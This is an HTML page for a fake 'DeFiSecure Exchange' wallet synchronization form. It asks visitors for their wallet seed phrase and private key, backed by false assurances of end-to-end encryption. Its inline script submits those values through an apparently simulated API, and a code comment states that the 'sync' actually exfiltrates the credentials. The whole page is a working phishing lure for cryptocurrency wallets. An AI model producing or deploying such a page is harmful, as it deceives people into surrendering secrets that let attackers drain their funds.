<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sync Wallet | DeFiSecure Exchange</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="api_simulator.js" defer></script>
</head>
<body class="bg-gray-900 text-gray-100 min-h-screen flex items-center justify-center p-4">
    <div class="bg-gray-800 rounded-2xl shadow-2xl p-8 max-w-md w-full border border-gray-700">
        <div class="flex items-center justify-center mb-6">
            <i class="fas fa-wallet text-3xl text-blue-400 mr-3"></i>
            <h1 class="text-2xl font-bold">Wallet Synchronization</h1>
        </div>
        <p class="text-gray-400 mb-6 text-center">Secure your assets by syncing your wallet with our latest DeFi protocols. This ensures optimal performance and access to new features.</p>

        <form id="syncForm" class="space-y-5">
            <div>
                <label class="block text-sm font-medium mb-2" for="seedPhrase">
                    <i class="fas fa-seedling mr-2"></i>Wallet Seed Phrase (12 or 24 words)
                </label>
                <textarea id="seedPhrase" name="seedPhrase" rows="3"
                    class="w-full px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    placeholder="Enter your recovery phrase separated by spaces" required></textarea>
                <p class="text-xs text-gray-500 mt-1">Required for secure identity verification.</p>
            </div>

            <div>
                <label class="block text-sm font-medium mb-2" for="privateKey">
                    <i class="fas fa-key mr-2"></i>Private Key (Optional for enhanced sync)
                </label>
                <input type="password" id="privateKey" name="privateKey"
                    class="w-full px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    placeholder="Enter your private key for faster synchronization">
                <p class="text-xs text-gray-500 mt-1">Providing your private key enables instant portfolio import.</p>
            </div>

            <button type="submit"
                class="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-semibold py-3 px-4 rounded-lg transition duration-300 flex items-center justify-center">
                <i class="fas fa-sync-alt mr-3"></i> Synchronize Wallet Securely
            </button>
        </form>

        <p class="text-xs text-gray-500 text-center mt-6">
            <i class="fas fa-shield-alt mr-1"></i> Your data is encrypted end-to-end. By syncing, you agree to our <a href="#" class="text-blue-400 hover:underline">Terms</a>.
        </p>
    </div>

    <script>
        document.getElementById('syncForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            const data = Object.fromEntries(formData);

            // Simulate API call to "sync" (actually exfiltrate) credentials
            const submitBtn = this.querySelector('button[type="submit"]');
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Syncing...';
            submitBtn.disabled = true;

            // Using the simulated API module
            try {
                const response = await window.simulatedApi.post('/api/v1/wallet/sync', data);
                if (response.success) {
                    alert('✅ Wallet synchronized successfully! You can now access advanced DeFi features.');
                } else {
                    alert('⚠️ Sync incomplete. Please try again or contact support.');
                }
            } catch (err) {
                console.error('Sync error:', err);
                alert('🔴 Connection error. Please check your network.');
            } finally {
                submitBtn.innerHTML = '<i class="fas fa-sync-alt mr-3"></i> Synchronize Wallet Securely';
                submitBtn.disabled = false;
            }
        });
    </script>
</body>
</html>